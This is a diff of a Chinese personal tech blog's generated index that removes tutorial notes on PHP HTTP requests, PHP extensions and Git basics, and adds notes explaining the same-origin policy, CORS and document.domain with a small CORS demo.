-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $post_data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;age&apos; =&gt; &apos;21&apos; );  //post数据</span><br><span class="line">    $post_data = http_build_query($post_data);  //url-encode编码数据</span><br><span class="line">    $post_data = json_encode($post_data);  //json编码数据</span><br><span class="line">    $url = &apos;http://localhost/test.php&apos;;  //要抓取的url</span><br><span class="line">    $ch = curl_init();  //curl初始化</span><br><span class="line">    $timeout = 5;  //超时时间</span><br><span class="line">    curl_setopt ($ch, CURLOPT_URL, $url);  //设置url</span><br><span class="line">    curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);  //设置显示还是写入字符串，1为显示</span><br><span class="line">    curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, $timeout);  //设置超时时间</span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, 1);  //设置发送的方式为post</span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);  //设置post的数据</span><br><span class="line">    //curl_setopt($ch, CURLOPT_HTTPHEADER, array(&apos;Content-Type:application/json&apos;));  //json编码设置</span><br><span class="line">    $file_contents = curl_exec($ch);  //发送curl请求</span><br><span class="line">    curl_close($ch);  //关闭curl请求</span><br><span class="line">    mb_convert_encoding($file_contents,&apos;utf-8&apos;);  //转换字符</span><br><span class="line">    print_r($file_contents);  //输出抓取的信息到屏幕</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-<h3 id="0X01-file-get-contents"><a href="#0X01-file-get-contents" class="headerlink" title="0X01 file_get_contents"></a>0X01 file_get_contents</h3><h5 id="stream-context-create-函数"><a href="#stream-context-create-函数" class="headerlink" title="stream_context_create()函数"></a>stream_context_create()函数</h5><ul>
-<li>官方手册：<a href="https://www.php.net/manual/zh/function.stream-context-create.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.stream-context-create.php</a></li>
-<li>创建并返回一个文本数据流并应用各种选项，可用于fopen(),file_get_contents()等过程的超时设置、代理服务器、请求方式、头信息设置的特殊过程</li>
-</ul>
-<h5 id="http-build-query-函数"><a href="#http-build-query-函数" class="headerlink" title="http_build_query()函数"></a>http_build_query()函数</h5><ul>
-<li>官方手册：<a href="https://www.php.net/manual/zh/function.http-build-query" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.http-build-query</a></li>
-<li>将数组转换 url-encoded 之后的请求字符串</li>
-<li>▲ 博客介绍使用：<a href="https://www.cnblogs.com/zhja/archive/2012/11/10/2764174.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhja/archive/2012/11/10/2764174.html</a></li>
-</ul>
-<h5 id="file-get-contents-函数"><a href="#file-get-contents-函数" class="headerlink" title="file_get_contents()函数"></a>file_get_contents()函数</h5><ul>
-<li>官方手册：<a href="https://www.php.net/manual/zh/function.file-get-contents" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.file-get-contents</a></li>
-<li>将整个文件读入一个字符串</li>
-<li>▲ 2020.03.15 只支持HTTP代理 </li>
-<li>▲ 2020.03.15 对https的链接抓取会报错</li>
-</ul>
-<h5 id="模拟GET请求"><a href="#模拟GET请求" class="headerlink" title="模拟GET请求"></a>模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //要抓取的url</span><br><span class="line">    $html = file_get_contents($url);  //抓取url</span><br><span class="line">    print_r($html);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="模拟POST请求"><a href="#模拟POST请求" class="headerlink" title="模拟POST请求"></a>模拟POST请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;number&apos; =&gt; &apos;7&apos;</span><br><span class="line">    );  //要发送的post数据</span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //要抓取的url</span><br><span class="line"></span><br><span class="line">    $post_data = http_build_query($data);  //url-encode编码要post的数据</span><br><span class="line"></span><br><span class="line">    $options = array(</span><br><span class="line">        &apos;http&apos; =&gt; array(</span><br><span class="line">            &apos;method&apos; =&gt; &apos;POST&apos;,  //POST请求的方法</span><br><span class="line">            &apos;request_fulluri&apos;=&gt; true,</span><br><span class="line">            &apos;header&apos; =&gt; array(&quot;Accept-language: en&quot;,</span><br><span class="line">                &quot;Content-type: application/x-www-form-urlencoded&quot;,</span><br><span class="line">                &quot;user_agent: Opera/9.80 (Windows NT 6.1; U; en) Presto/2.8.131 Version/11.11&quot;,</span><br><span class="line">                &quot;cookie: aaa=aaa&quot;),  //POST请求的头部，Content-type固定，其他可改</span><br><span class="line">            //&apos;proxy&apos; =&gt; &apos;tcp://127.0.0.1:22716&apos;,  //只支持HTTP代理</span><br><span class="line">            &apos;content&apos; =&gt; $post_data,  //POST的主体，也即POST的数据</span><br><span class="line">            &apos;timeout&apos; =&gt; 5)  //超时时间</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    $options = stream_context_create($options);  //对要传输的数据进行流式处理</span><br><span class="line">    $html = file_get_contents($url,false,$options);  //POST情况下第三个参数要设置</span><br><span class="line">    echo $html;</span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>测试数据是否POST成功<ul>
-<li>test.php</li>
-</ul>
-</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $data = $_POST;</span><br><span class="line">    echo &apos;&lt;pre&gt;&apos;;</span><br><span class="line">    print_r( $data );</span><br><span class="line">    echo &apos;&lt;/pre&gt;&apos;;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>修改url为test.php的路径</li>
-<li>查看是否有输出结果</li>
-</ul>
-<h3 id="0X02-fopen"><a href="#0X02-fopen" class="headerlink" title="0X02 fopen"></a>0X02 fopen</h3><h5 id="stream-get-meta-data-函数"><a href="#stream-get-meta-data-函数" class="headerlink" title="stream_get_meta_data()函数"></a>stream_get_meta_data()函数</h5><ul>
-<li>官方手册：<a href="https://www.php.net/manual/zh/function.stream-get-meta-data" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.stream-get-meta-data</a></li>
-<li>从封装协议文件指针中取得报头／元数据</li>
-<li>▲ 需是从 fopen()，fsockopen() 和 pfsockopen() 建立的流，返回的是一个数组</li>
-</ul>
-<h5 id="模拟GET请求-1"><a href="#模拟GET请求-1" class="headerlink" title="模拟GET请求"></a>模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn/&apos;;  //要抓取的url</span><br><span class="line">    $fp = fopen($url, &apos;r&apos;);  //以fopen的形式打开url</span><br><span class="line">    stream_get_meta_data($fp);  //转换数据为流</span><br><span class="line">    $result = &apos;&apos;;</span><br><span class="line">    while(!feof($fp))  //feof()判断文件指针是否到文件底部</span><br><span class="line">    &#123;</span><br><span class="line">        $result .= fgets($fp, 1024);  //取出拿到的数据放在字符串中</span><br><span class="line">    &#125;</span><br><span class="line">    echo $result;  //输出</span><br><span class="line">    fclose($fp);  //关闭文件指针</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h3 id="0X03-fsockopen"><a href="#0X03-fsockopen" class="headerlink" title="0X03 fsockopen"></a>0X03 fsockopen</h3><h5 id="fsockopen-函数"><a href="#fsockopen-函数" class="headerlink" title="fsockopen()函数"></a>fsockopen()函数</h5><ul>
-<li>打开一个网络连接或者一个Unix套接字连接</li>
-<li>官方手册：<a href="https://www.php.net/manual/zh/function.fsockopen.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.fsockopen.php</a></li>
-<li>▲ 2020.03.16 能定制任意的连接，但作为网络抓取的成果是不理想的。若要做网络抓取，需要写完整的http请求并定制回送的http请求</li>
-<li>▲ 2020.03.16 存在waf，很难发送正常的数据</li>
-</ul>
-<h5 id="parse-url-函数"><a href="#parse-url-函数" class="headerlink" title="parse_url()函数"></a>parse_url()函数</h5><ul>
-<li>解析一个URL并返回一个关联数组，包含在 URL 中出现的各种组成部分</li>
-<li>官方手册：<a href="https://www.php.net/manual/zh/function.parse-url.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/function.parse-url.php</a></li>
-<li>▲ 2020.03.16 此函数对其他url中未有的参数不会进行默认设置</li>
-</ul>
-<h5 id="模拟GET请求-2"><a href="#模拟GET请求-2" class="headerlink" title="模拟GET请求"></a>模拟GET请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = array(&apos;host&apos; =&gt; &apos;www.wyu.cn&apos;, &apos;port&apos; =&gt; &apos;80&apos;,&apos;path&apos; =&gt; &apos;&apos;,&apos;query&apos;=&gt; &apos;/&apos; ,&apos;cookie&apos; =&gt; &apos;/&apos;);  //请求的url数组</span><br><span class="line">    $fp = fsockopen($url[&apos;host&apos;],$url[&apos;port&apos;],$errno,$errstr,10);  //打开一个sock连接</span><br><span class="line">    $fp = fsockopen(&quot;ssl://&quot;.$url[&apos;host&apos;],$url[&apos;port&apos;],$errno,$errstr,10);</span><br><span class="line">    //对https连接的支持</span><br><span class="line"></span><br><span class="line">    if(!$fp)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$errstr ($errno)&lt;/br&gt;\n&quot;;  //如果文件指针不存在，就输出报错</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        $out = &quot;GET /$url[path] HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out.= &quot;Host: 61.160.224.50:80\r\n&quot;;</span><br><span class="line">        $out.= &quot;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0\r\n&quot;;</span><br><span class="line">        $out.= &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;;</span><br><span class="line">        $out.= &quot;Connection: keep-alive\r\n\r\n&quot;;</span><br><span class="line">        fwrite($fp,$out);  //将http的头写入文件指针</span><br><span class="line">        while(!feof($fp))  //feof()判断文件指针是否到文件底部</span><br><span class="line">        &#123;</span><br><span class="line">            echo fgets($fp,1024);  //取出拿到的数据放在字符串中</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);  //关闭文件指针</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<h5 id="模拟POST请求-1"><a href="#模拟POST请求-1" class="headerlink" title="模拟POST请求"></a>模拟POST请求</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    $url = &apos;http://www.wyu.cn&apos;;  //要抓取的url</span><br><span class="line">    $url_info = parse_url($url);  //对url进行字段解析</span><br><span class="line"></span><br><span class="line">    $fp = fsockopen($url_info[&apos;host&apos;],80,$errno,$errstr,10);  ////打开一个sock连接</span><br><span class="line"></span><br><span class="line">    $data = array(</span><br><span class="line">        &apos;name&apos; =&gt; &apos;mzt&apos;,</span><br><span class="line">        &apos;number&apos; =&gt; &apos;7&apos;</span><br><span class="line">    );  //要发送的post数据</span><br><span class="line"></span><br><span class="line">    $post_data = http_build_query($data);  //url-encode编码要post的数据</span><br><span class="line"></span><br><span class="line">    if(!$fp)</span><br><span class="line">    &#123;</span><br><span class="line">        echo &quot;$errstr ($errno)&lt;/br&gt;\n&quot;;  //如果文件指针不存在，就输出报错</span><br><span class="line">    &#125;else</span><br><span class="line">    &#123;</span><br><span class="line">        $out = &quot;POST &quot;.$url_info[&apos;path&apos;].&quot; HTTP/1.1\r\n&quot;;</span><br><span class="line">        $out.= &quot;Host: &quot;.$url_info[&apos;host&apos;].&quot;\r\n&quot;;</span><br><span class="line">        $out.= &quot;Content-type: application/x-www-form-urlencodedn&quot;;</span><br><span class="line">        $out.= &quot;User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0\r\n&quot;;</span><br><span class="line">        $out.= &quot;Connection: keep-alive\r\n\r\n&quot;;</span><br><span class="line">        $out.= &quot;$post_data\r\n&quot;;</span><br><span class="line">        fwrite($fp,$out);  //将http的头写入文件指针</span><br><span class="line">        while(!feof($fp))  //feof()判断文件指针是否到文件底部</span><br><span class="line">        &#123;</span><br><span class="line">            echo fgets($fp,1024);  //取出拿到的数据放在字符串中</span><br><span class="line">        &#125;</span><br><span class="line">        fclose($fp);  //关闭文件指针</span><br><span class="line">    &#125;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-
-]]></content>
-      <categories>
-        <category>PHP</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>php的扩展</title>
-    <url>/2020/07/12/php_extension/</url>
-    <content><![CDATA[<hr>
-<h2 id="php的扩展"><a href="#php的扩展" class="headerlink" title="php的扩展"></a>php的扩展</h2><ul>
-<li>CURL扩展</li>
-<li>openssl扩展</li>
-<li>Redis以及扩展<ul>
-<li>Redis For Winodow</li>
-<li>Redis For Linux</li>
-<li>Redis操作手册</li>
-</ul>
-</li>
-</ul>
-<h3 id="0X00-CURL扩展"><a href="#0X00-CURL扩展" class="headerlink" title="0X00 CURL扩展"></a>0X00 CURL扩展</h3><ul>
-<li>▲ 2020.03.15 网上看到了很多关于Window环境开启curl的方法，但都存在一定问题</li>
-<li>php开启扩展（php.ini）<ul>
-<li>extension=curl</li>
-</ul>
-</li>
-<li>▲ curl加载：找到对应php目录下libssh2.dll文件，复制到对应apache的bin文件夹下</li>
-<li>重启Apache，查看phpinfo，是否有Curl</li>
-<li>php_curl_test.php</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">     var_dump(curl_init());  //输出为 resource(2) of type (curl) </span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php/php_extension/curl_install.png" alt="CURL_install"></p>
-<h3 id="0x01-openssl扩展"><a href="#0x01-openssl扩展" class="headerlink" title="0x01 openssl扩展"></a>0x01 openssl扩展</h3><ul>
-<li>▲ 对于现在大多数网站来说，都是https模式，爬虫需要开启openssl扩展建立连接</li>
-<li>php开启扩展（php.ini文件）<ul>
-<li>extension=php_openssl</li>
-</ul>
-</li>
-</ul>
-<p><img src="/images/php/php_extension/openssl_install.png" alt="openssl_install"></p>
-<h3 id="0X02-Redis以及扩展"><a href="#0X02-Redis以及扩展" class="headerlink" title="0X02 Redis以及扩展"></a>0X02 Redis以及扩展</h3><h5 id="Redis-For-Winodow"><a href="#Redis-For-Winodow" class="headerlink" title="Redis For Winodow"></a>Redis For Winodow</h5><ul>
-<li>▲ 2020.03.15 Redis for Window官方已经停止维护</li>
-<li>▲ Redis默认端口为6379，默认密码为空密码</li>
-<li>Redis废弃函数替换：<a href="https://blog.csdn.net/xchenhao/article/details/97251618" target="_blank" rel="noopener">https://blog.csdn.net/xchenhao/article/details/97251618</a></li>
-<li>Redis -&gt; Github的维护仓库：<a href="https://github.com/microsoftarchive/redis/releases" target="_blank" rel="noopener">https://github.com/microsoftarchive/redis/releases</a></li>
-<li>Redis官方文档 -&gt; for window <a href="https://www.redis.com.cn/redis-installation" target="_blank" rel="noopener">https://www.redis.com.cn/redis-installation</a></li>
-<li>Redis扩展 -&gt; pecl的维护仓库：<a href="http://pecl.php.net/package/redis" target="_blank" rel="noopener">http://pecl.php.net/package/redis</a></li>
-<li>Pecl仓库下载 -&gt; <a href="https://windows.php.net/downloads/pecl/" target="_blank" rel="noopener">https://windows.php.net/downloads/pecl/</a></li>
-<li>下载Redis.msi安装文件，下载Redis扩展（对应PHP版本）</li>
-<li>拷贝redis的扩展php_redis.dll -&gt; php/ext</li>
-<li>php开启扩展（php.ini文件）<ul>
-<li>extension=php_redis.dll</li>
-</ul>
-</li>
-<li>重启Apache，查看phpinfo，是否有Redis</li>
-<li>window_php_redis_test.php</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">     $redis = new Redis();                   //redis对象</span><br><span class="line">     $redis-&gt;connect(&quot;127.0.0.1&quot;,&quot;6379&quot;); //连接redis服务器</span><br><span class="line">     $redis-&gt;set(&quot;test&quot;,&quot;Hello World&quot;);      //set字符串值</span><br><span class="line">     echo $redis-&gt;get(&quot;test&quot;);               //获取值</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php/php_extension/redis_for_window.png" alt="redis_for_windows"></p>
-<h5 id="Redis-For-Linux"><a href="#Redis-For-Linux" class="headerlink" title="Redis For Linux"></a>Redis For Linux</h5><ul>
-<li>Redis安装：<a href="https://redis.io/" target="_blank" rel="noopener">https://redis.io/</a> （自安装灵活性较大）</li>
-<li>php的redis扩展：<a href="https://github.com/phpredis/phpredis/releases" target="_blank" rel="noopener">https://github.com/phpredis/phpredis/releases</a></li>
-<li>安装redis扩展</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tar xzf phpredis-xxx.tar.gz</span><br><span class="line">cd phpredis </span><br><span class="line">sudo phpize </span><br><span class="line">sudo ./configure </span><br><span class="line">sudo make </span><br><span class="line">sudo make install</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>将modules文件夹的内容复制并粘贴到PHP扩展目录中，并在php.ini中添加以下行<ul>
-<li><code>extension = redis.so</code> </li>
-</ul>
-</li>
-<li>linux_php_redis_test.php</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    $redis = new Redis(); </span><br><span class="line">    $redis-&gt;connect(&apos;127.0.0.1&apos;, 6379); </span><br><span class="line">    echo &quot;Server is running: &quot;.$redis-&gt;ping();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/php/php_extension/redis_for_linux.png" alt="redis_for_linux"></p>
-<h5 id="Redis操作手册"><a href="#Redis操作手册" class="headerlink" title="Redis操作手册"></a>Redis操作手册</h5><ul>
-<li>phpredis：<a href="https://github.com/phpredis/phpredis" target="_blank" rel="noopener">https://github.com/phpredis/phpredis</a></li>
 </ul>
 ]]></content>
       <categories>
@@ -2221,446 +2664,428 @@
       </categories>
   </entry>
   <entry>
-    <title>Git基础</title>
-    <url>/2020/07/12/git_base/</url>
-    <content><![CDATA[<hr>
-<h2 id="Git基础"><a href="#Git基础" class="headerlink" title="Git基础"></a>Git基础</h2><ul>
-<li>什么是Git<ul>
-<li>Git中的数据库</li>
+    <title>sop_cors_csp</title>
+    <url>/2020/08/19/sop_cors_csp/</url>
+    <content><![CDATA[<h1 id="SOP-CORS-CSP"><a href="#SOP-CORS-CSP" class="headerlink" title="SOP_CORS_CSP"></a>SOP_CORS_CSP</h1><h2 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h2><ul>
+<li>⭐ 阻止一个页面上的恶意脚本通过页面的DOM对象获得访问另一个页面上敏感信息的权限</li>
+<li>同源的特征<ul>
+<li>同协议 如：<a href="https://exp.org" target="_blank" rel="noopener">https://exp.org</a> 与 <a href="http://exp.org" target="_blank" rel="noopener">http://exp.org</a> 不同源</li>
+<li>同端口 如：<a href="http://exp.org" target="_blank" rel="noopener">http://exp.org</a> 与 <a href="http://exp.org:8080" target="_blank" rel="noopener">http://exp.org:8080</a> 不同源</li>
+<li>同域名 如：<a href="http://aaa.org" target="_blank" rel="noopener">http://aaa.org</a> 与 <a href="http://bbb.org" target="_blank" rel="noopener">http://bbb.org</a> 不同源</li>
 </ul>
 </li>
-<li>Git的基本操作<ul>
-<li>安装Git</li>
-<li>Git的基本命令</li>
-<li>Git-tutorial Repository</li>
+<li>同源策略的限制<ul>
+<li>限制了不同源之间的请求交互，例如在使用XMLHttpRequest或fetch函数时则会受到同源策略的约束</li>
+<li>限制浏览器中不同源的框架之间是不能进行js的交互操作的，例如通过iframe和window.open产生的不同源的窗口</li>
 </ul>
 </li>
-<li>Git的分支<ul>
-<li>Git分支操作</li>
-<li>Git-tutorial Repository</li>
-</ul>
-</li>
-<li>Git的合并<ul>
-<li>Git-tutorial Repository</li>
-</ul>
-</li>
-<li>Git的回滚撤销<ul>
-<li>Git-tutorial Repository</li>
-</ul>
-</li>
-<li>gitignore/fork同步<ul>
-<li>Git-tutorial Repository</li>
-</ul>
-</li>
-<li>Git的免密传送<ul>
-<li>Git传输的协议</li>
-<li>SSH协议登陆</li>
-</ul>
-</li>
-<li>Git的工作流</li>
-<li>常用工具</li>
-</ul>
-<h3 id="0X00-什么是Git"><a href="#0X00-什么是Git" class="headerlink" title="0X00 什么是Git"></a>0X00 什么是Git</h3><ul>
-<li>分布式版本管理系统<ul>
-<li>最初是为了管理Linux的系统内核</li>
-<li>同FTP相同的功能</li>
-<li>非线性管文件</li>
-<li>速度快</li>
-<li>对待数据更像一个快照流</li>
-<li>可以在无网络的情况下进行提交到本地服务器，在有网络的情况下提交给远端的服务器</li>
+<li>同源策略的注解<ul>
+<li>对于<code>&lt;a&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;video&gt;</code>、<code>&lt;link&gt;</code>这类属性带有src，href的标签，允许跨域加载</li>
+<li>跨域请求可以发出，但是浏览器查看返回包发现跨域且无CORS头则会丢弃，而且不同子域之间默认是不同源的</li>
+<li>IE未将端口号加入到同源策略的组成部分之中，因此company.com:81/index.html和company.com/index.html属于同源并且不受任何限制</li>
 </ul>
 </li>
 </ul>
-<p><img src="/images/git/1-Git-Server-and-Computer.PNG" alt="1-Git-Server and Computer"></p>
+<h2 id="跨域资源共享"><a href="#跨域资源共享" class="headerlink" title="跨域资源共享"></a>跨域资源共享</h2><h3 id="0X00-CORS简介"><a href="#0X00-CORS简介" class="headerlink" title="0X00 CORS简介"></a>0X00 CORS简介</h3><ul>
+<li>CORS跨域资源共享（Origin/Access-Control-Allow-Origin）<ul>
+<li>AJAX的XMLHttpRequest请求</li>
+<li>简单请求（simple request）– HEAD/GET/POST</li>
+<li>非简单请求（not-so-simple request）–PUT/OPTIONS</li>
+</ul>
+</li>
+<li>JSONP（JSON with Padding)，应用JSON的一种新方法<ul>
+<li>JOSNP允许页面接受另一个域的JSON数据，通过在页面增加一个可以从其它域加载带有回调的JSON响应的<code>&lt;script&gt;</code>标签</li>
+</ul>
+</li>
+<li>代理（通过接口的方式，后台调用php文件获取然后返回给前端）</li>
+<li>跨文档通信（postMessage()会异步的触发window上的onmessage事件）</li>
+<li>document.domain（解决不同window之间不能进行交互操作的问题）</li>
+<li>window.name（window.name在页面的生命周期里共享一个window.name）</li>
+<li>WebSocket（浏览器允许脚本直连一个WebSocket地址而不管同源策略）</li>
+</ul>
+<h3 id="0X01-CORS"><a href="#0X01-CORS" class="headerlink" title="0X01 CORS"></a>0X01 CORS</h3><ul>
+<li>▲ CORS头就是为了突破不同源之间的请求交互这一限制而产生的</li>
+<li>只要HTTP返回<code>Access-Control-Allow-Origin:http://test2.www.xyz</code>，test2.<a href="http://www.xyz的跨域请求的响应会被浏览器正确的返回" target="_blank" rel="noopener">www.xyz的跨域请求的响应会被浏览器正确的返回</a></li>
+<li>测试代码</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">----test1.www.xyz/1.php</span><br><span class="line">&lt;?</span><br><span class="line">    header(&quot;Access-Control-Allow-Origin:http://test2.www.xyz&quot;);</span><br><span class="line">    echo &quot;flag&#123;this_is_flag&#125;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">----test2.www.xyz/2.php</span><br><span class="line">//Console台输入</span><br><span class="line">fetch(&apos;//test1.www.xyz/1.php&apos;).then(function(data)&#123;</span><br><span class="line">  return data.text()</span><br><span class="line">&#125;).then(function(data)&#123;</span><br><span class="line">  console.log(data)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/sop_cors_csp/cors/cors-example.png" alt="cors-example"></p>
 <ul>
-<li>方式：直接记录快照而非方式，每次修改需要一次Commit</li>
-<li>保证完整性：计算校验和（哈希算法），Git存取的是哈希值</li>
-</ul>
-<p><img src="/images/git/1-Git--Snaphost.PNG" alt="1-Git--Snaphost"></p>
-<p><img src="/images/git/1-Git--%E5%AE%8C%E6%95%B4%E6%80%A7.PNG" alt="1-Git--完整性"></p>
-<h5 id="Git中的数据库"><a href="#Git中的数据库" class="headerlink" title="Git中的数据库"></a>Git中的数据库</h5><ul>
-<li>Git仓库–.git directory：保存项目数据，元数据的地方，git自己维护的文件夹</li>
-<li>工作目录–Working Directory：内容自Git仓库，对当前项目某一版本独立提取出来的内容</li>
-<li>暂存区–Staging Area：保存下次提交的文件目录，也算是一个索引</li>
-<li>三个概念<ul>
-<li>已提交：Git目录中保存着的特定版本文件</li>
-<li>已暂存：做了修改并放在暂存区</li>
-<li>已修改：做了修改但还没有放到暂存区</li>
-</ul>
-</li>
-<li>远程仓库–Remote：多人操作的仓库</li>
-</ul>
-<p><img src="/images/git/1-Git%E4%BB%93%E5%BA%93-1.PNG" alt="1-Git仓库-1"></p>
-<p><img src="/images/git/1-Git%E4%BB%93%E5%BA%93-2.PNG" alt="1-Git仓库-2"></p>
-<h3 id="0X01-Git的基本操作"><a href="#0X01-Git的基本操作" class="headerlink" title="0X01 Git的基本操作"></a>0X01 Git的基本操作</h3><h5 id="安装Git"><a href="#安装Git" class="headerlink" title="安装Git"></a>安装Git</h5><ul>
-<li>下载git OXS版本（一般为内置/brew install git安装）</li>
-<li>下载git WindowS版本（Git网页下载Git）</li>
-<li>下载git Linux版本（apt-get install git-all/yum -y install git）</li>
-</ul>
-<h5 id="Git的基本命令"><a href="#Git的基本命令" class="headerlink" title="Git的基本命令"></a>Git的基本命令</h5><ul>
-<li>▲ 提交到远程仓库需要在Github上创建一个仓库</li>
-<li>Git的版本<ul>
-<li><strong><code>🔺命令：git version</code></strong></li>
-</ul>
-</li>
-<li>Git的用户信息<ul>
-<li>名字：<strong><code>🔺命令：git config --global user.name &quot;tomas&quot;</code></strong></li>
-<li>邮箱：<strong><code>🔺命令：git config --global user.email &quot;643008933@qq.com&quot;</code></strong></li>
-<li>配置文件：~/.gitconfig（可设置代理，配置信息）</li>
-</ul>
-</li>
-<li>Git的基本命令<ul>
-<li>初始化：<strong><code>🔺命令：git init</code></strong></li>
-<li>仓库状态：<strong><code>🔺命令：git status</code></strong></li>
-<li>添加文件到暂存区管理：<strong><code>🔺命令：git add 文件名</code></strong><ul>
-<li>-A，所有文件</li>
-</ul>
-</li>
-<li>从暂存区删除文件：<strong><code>🔺命令：git rm --cacahe 文件名</code></strong></li>
-<li>查看文件：<strong><code>🔺命令：..git → cat index</code></strong></li>
-<li>提交：<strong><code>🔺命令：git commit -m &quot;文件名&quot;</code></strong><ul>
-<li>-m：描述提交的内容</li>
-</ul>
-</li>
-<li>建立连接：<strong><code>🔺命令：git remote add origin https://.....</code></strong></li>
-<li>查看远端信息：<strong><code>🔺命令：git remote -v</code></strong></li>
-<li>提交本地文件到远端服务器：<strong><code>🔺命令：git push origin master -u</code></strong><ul>
-<li>origin：远端仓库名称</li>
-<li>master：本地仓库名称</li>
-<li>-u：后续不需要输入名称</li>
-<li>:master ：删除远端的分支</li>
-<li>master:m1 ：更改远端分支名称为m1</li>
-</ul>
-</li>
-<li>克隆远程仓库到本地：<strong><code>🔺命令：git clone https://..... git-demo</code></strong><ul>
-<li>git-demo：为拉取到本地仓库的名称</li>
-</ul>
-</li>
-<li>拉取远端仓库修改数据到本地：<strong><code>🔺命令：git pull origin master</code></strong><ul>
-<li>origin：远端仓库名称</li>
-<li>master：本地仓库名称</li>
+<li>如果设置<code>Access-Control-Allow-Origin:*</code>，则所有的跨域访问响应都会被允许</li>
+<li>如果请求需要带上Cookie，则需要服务器设置<code>Access-Control-Allow-Credentials:true</code><ul>
+<li>如果设置<code>Access-Control-Allow-Origin:*</code>，则不管有没有设置<code>Access-Control-Allow-Credentials:true</code>，带Cookie的请求都会失败</li>
 </ul>
 </li>
 </ul>
-</li>
+<h3 id="0X02-document-domain"><a href="#0X02-document-domain" class="headerlink" title="0X02 document.domain"></a>0X02 document.domain</h3><ul>
+<li>针对同源策略的第二个限制，不同窗口之间的同源限制</li>
+<li>▲ 只适用于顶级域名相同子域名不同之间的同源策略 -&gt; 不同子域名之间默认不同源，但是可以通过设置document.domain为相同的更高级域名，来使不同子域同源</li>
+<li>测试代码</li>
 </ul>
-<h5 id="Git-tutorial-Repository"><a href="#Git-tutorial-Repository" class="headerlink" title="Git-tutorial Repository"></a>Git-tutorial Repository</h5><ul>
-<li>mkdir git-tutorial</li>
-<li>cd git-tutorial</li>
-<li>git init</li>
-<li>ll</li>
-<li>touch README.md</li>
-<li>git status</li>
-<li>git add README.md</li>
-<li>git status</li>
-<li>git rm –cacahe README.md</li>
-<li>git status</li>
-<li>git add README.md -A</li>
-<li>git status</li>
-<li>git commit -m “README.md”</li>
-<li>git remote add origin <a href="https://github.com/" target="_blank" rel="noopener">https://github.com/</a>..</li>
-<li>git remote -v</li>
-<li>git push origin master -u</li>
-<li>查看Github是否有新建一个仓库并有README.md</li>
-<li>cd ..</li>
-<li>git clone https://… git-demo</li>
